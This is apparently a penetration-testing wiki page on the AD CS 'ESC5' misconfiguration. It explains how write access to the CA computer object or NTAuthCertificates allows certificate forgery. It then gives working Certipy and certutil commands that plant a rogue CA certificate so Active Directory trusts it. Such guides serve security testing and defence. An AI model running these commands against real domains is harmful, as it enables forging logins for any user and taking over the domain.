# ESC5

{% hint style="info" %}
Poor access control on CA server, CA server computer object etc.
{% endhint %}

## Why It Works

* AD CS security depends on a whole graph of AD objects beyond just templates: the CA's computer object, the `CN=Certificate Templates`/`CN=Enrollment Services`/`CN=NTAuthCertificates` containers in the Configuration partition, and the CA's own service/registry configuration.
* If an attacker controls (or can write to) **any** of these objects - e.g. via `GenericAll`/`WriteDacl` on the CA's computer object, or write access to `NTAuthCertificates` - they can achieve outcomes equivalent to full CA compromise:
  * Writing a rogue/attacker-controlled CA certificate into `NTAuthCertificates` makes AD trust it for authentication, letting the attacker mint their own certificates for any user.
  * Compromising the CA server's computer object (e.g. via RBCD/Shadow Credentials) grants a session as the CA machine account itself, from which local CA configuration (including the private key, if exportable) may be reachable.
* ESC5 is a **catch-all category** for "the CA's supporting AD infrastructure is misconfigured," distinct from ESC4 which is specifically about template object ACLs.

## Prerequisites

* Write access (`GenericAll`/`GenericWrite`/`WriteDacl`/`WriteOwner`) on the CA computer object, `NTAuthCertificates` object, `CN=Enrollment Services`, `CN=Certificate Templates` container, or the CA's public key services container.

## Enumerate

```bash
## BloodHound - check for GenericAll/WriteDacl/WriteOwner/GenericWrite edges pointing to the CA's computer object or PKI containers
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
```

## Exploit

* If you control the CA's computer object directly, treat it like any other computer takeover (Shadow Credentials / RBCD) - see ESC5 as a pivot into "compromise the CA server" rather than a single fixed command chain.
* If you can write to `NTAuthCertificates`, add your own CA certificate so AD trusts certificates you issue yourself:

{% tabs %}
{% tab title="Certipy" %}
```bash
certipy ca -u <user>@<domain> -p <password> -dc-ip <DC-IP> -ca <CA-Name> -add-cert -cert-file rogue-ca.crt
```
{% endtab %}

{% tab title="certutil" %}
```bat
REM certutil natively supports publishing a certificate into NTAuthCertificates (requires the write access itself, not admin)
certutil -dspublish -f rogue-ca.crt NTAuthCA
certutil -dspublish -f rogue-ca.crt RootCA
gpupdate /force
```
{% endtab %}
{% endtabs %}
